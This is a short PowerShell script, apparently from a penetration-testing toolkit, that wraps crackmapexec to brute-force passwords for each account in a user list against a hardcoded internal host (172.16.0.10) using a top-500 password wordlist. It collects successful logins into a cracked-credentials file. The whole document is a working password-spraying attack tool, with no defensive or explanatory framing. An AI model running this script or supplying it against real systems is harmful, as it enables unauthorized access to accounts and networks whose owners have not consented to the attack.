<#

TO DO
=========
Make it so can run in CLI without having to set manually 

#>

function run-cme {

# Set these variables accordingly 	
$target = "172.16.0.10"
$userlist = Get-Content C:\Windows\Temp\users.txt
$passlist = "C:\Windows\Temp\onhost\wordlists\pass_top-500.txt"

# add the date at stat and end just for timing 
date 
echo "" > cme_brute_cracked.txt
ForEach ($user in $userlist) {
echo ""
write-host ===========================[ $user ]===========================
.\crackmapexec.exe $target -u $user -p $passlist 
write-host ================================================================
Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
}  
date
Get-Content .\cme_brute_cracked.txt
}

# Run 
run-cme | Tee cme_brute.txt

